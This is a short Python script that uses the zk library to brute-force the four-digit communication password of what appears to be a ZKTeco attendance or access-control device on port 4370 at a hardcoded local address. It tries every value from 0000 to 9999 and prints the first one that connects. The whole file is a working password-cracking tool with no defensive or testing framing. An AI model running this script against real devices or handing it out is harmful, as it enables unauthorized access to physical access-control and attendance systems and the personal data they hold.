from zk import ZK


#bruteforcing the password

def bruteforce(ip, port, password):
    zk = ZK(ip=ip,port=port,verbose=True,password=password,timeout=5)
    try:
        zk.connect()
        return password
    except:
        return False
    

def main():
    ## brute force number that contains 4 in length
    
    for i in range(0,10000):
        password = str(i).zfill(4)
        #password = str(i)
        #print(i)
        # result = bruteforce("192.168.0.220",4370,i)
        result = bruteforce("192.168.0.220",4370,password)
        
        if result != False:
            print("!!!!!!!!!!!password is {}".format(result))
            break
        
            

if __name__ == "__main__":
    main()
